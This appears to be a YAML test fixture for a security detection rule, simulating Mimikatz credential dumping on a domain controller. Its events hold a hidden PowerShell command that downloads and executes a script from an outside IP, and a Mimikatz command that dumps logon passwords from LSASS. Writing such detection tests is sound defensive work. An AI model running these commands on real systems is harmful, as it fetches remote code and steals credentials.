name: credential_dumping
description: >
  cmd.exe spawns a PowerShell session that reflectively loads Mimikatz and
  dumps credentials from LSASS memory. Verifies the native "Mimikatz
  Execution" rule still fires on the credential-dumping command signature.
mitre_techniques:
  - T1003.001

events:
  - timestamp: "2026-07-24T02:47:11Z"
    hostname: DC01
    username: "CORP\\svc_backup"
    process_name: cmd.exe
    parent_process: services.exe
    command_line: "cmd.exe /c powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/m.ps1')\""

  - timestamp: "2026-07-24T02:47:13Z"
    hostname: DC01
    username: "CORP\\svc_backup"
    process_name: powershell.exe
    parent_process: cmd.exe
    command_line: "powershell.exe -nop -w hidden -c \"Invoke-Mimikatz -DumpCreds\" # sekurlsa::logonpasswords"

expected_detections:
  - "Mimikatz Execution"
